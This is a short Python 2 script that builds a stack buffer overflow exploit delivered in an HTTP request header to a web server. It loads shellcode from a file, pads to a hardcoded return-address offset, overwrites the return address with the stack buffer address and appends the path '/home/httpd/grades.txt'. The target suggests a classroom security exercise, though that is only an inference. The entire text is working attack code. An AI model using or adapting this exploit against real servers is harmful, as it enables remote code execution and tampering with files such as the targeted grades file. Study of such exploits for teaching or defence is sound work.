#!/usr/bin/python
import urllib
import struct

stack_buffer = 0xbfffdbf4 
stack_rv = 0xbfffde0c

def build_exploit():
    shellfile = open("shellcode-iny2.bin", "r")
    shellcode = shellfile.read()

    mystring = "/home/httpd/grades.txt"
    direcc = shellcode
    for x in xrange(0, stack_rv - stack_buffer  - len(shellcode)  ):
        direcc += "a"
    direcc += struct.pack( "<I", stack_buffer )
    direcc += mystring

    req =   "GET / HTTP/1.0\r\n" + \
            "a: "+ direcc + "\r\n" + \
            "\r\n"
    return req
